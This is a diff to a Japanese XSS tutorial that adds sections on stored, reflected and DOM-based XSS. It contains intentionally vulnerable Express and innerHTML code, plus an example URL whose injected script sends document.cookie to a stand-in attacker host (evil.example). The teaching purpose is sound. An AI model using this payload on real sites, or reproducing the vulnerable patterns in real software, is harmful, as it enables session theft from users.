@@ -31,7 +31,11 @@ XSS には攻撃コードの経路によって 3 つの型があります。
 | **反射型**（Reflected） | 攻撃コードが URL のパラメータに仕込まれ、サーバーがそのまま返すと実行される |
 | **DOM 型**（DOM-based） | サーバーを経由せず、クライアントの JavaScript がユーザー入力を HTML に書き込んで発生する |
 
-冒頭の例は格納型で、最も危険です。どの型でも原因は同じです。ユーザー入力が HTML や JavaScript として解釈されてしまうことです。
+どの型でも原因は同じで、ユーザー入力が HTML や JavaScript として解釈されてしまうことです。攻撃コードがどこを通るかが異なります。
+
+### 格納型: 掲示板のコメント
+
+冒頭の例がこれです。攻撃コードが DB に保存されるので、そのページを開いた**全員**が被害を受けます。最も危険な型です。
 
 ```mermaid
 sequenceDiagram
@@ -39,11 +43,51 @@ sequenceDiagram
   participant S as サイト
   participant V as 一般の閲覧者
   A->>S: スクリプト入りのコメントを投稿
+  S->>S: DB に保存
   V->>S: いつも通りページを開く
   S->>V: コメントを HTML として埋め込んだページを返す
   Note over V: 閲覧者のブラウザで<br>攻撃者のコードが実行される
-  V->>A: Cookie などが送信されてしまう
 ```
+
+### 反射型: 検索ページ
+
+サーバーが検索キーワードをそのまま HTML に埋め込んで返すパターンです。
+
+```js
+// サーバー側のコード
+app.get("/search", (req, res) => {
+  res.send(`<p>「${req.query.q}」の検索結果</p>`);
+});
+```
+
+攻撃者はこんな URL をメールで送りつけます。
+
+```
+https://shop.example.com/search?q=<script>fetch('https://evil.example/?c='+document.cookie)</script>
+```
+
+サーバーが `q` の中身をそのまま HTML に組み立てて返すので、クリックした人のブラウザでスクリプトが実行されます。DB には保存されないので、被害はこの URL を踏んだ人だけです。
+
+### DOM 型: クライアントの JS が組み立てる
+
+サーバーではなく、ブラウザの JavaScript が URL のパラメータを HTML に書き込んでしまうパターンです。
+
+```js
+// ブラウザで動く JavaScript
+const q = new URL(location).searchParams.get("q");
+document.getElementById("output").innerHTML = q;
+```
+
+同じように `?q=<img src=x onerror=...>` を仕込んだ URL を踏ませますが、**サーバーは安全な HTML を返しています**。ブラウザの JS が URL のパラメータを読み取って `innerHTML` に書き込むことで、クライアントだけで発火します。
+
+### 反射型と DOM 型の違い
+
+どちらも「URL に攻撃コードを仕込んで踏ませる」点は同じです。違いは**危険な HTML を組み立てるのがサーバーか、ブラウザの JS か**です。
+
+| | 危険な HTML を組み立てるのは | サーバーのレスポンス |
+|---|---|---|
+| 反射型 | サーバー | スクリプトが入っている |
+| DOM 型 | ブラウザの JS | 無害（JS が後から書き換える） |
 
 ## なぜ「文字」が「コード」になるのか
 
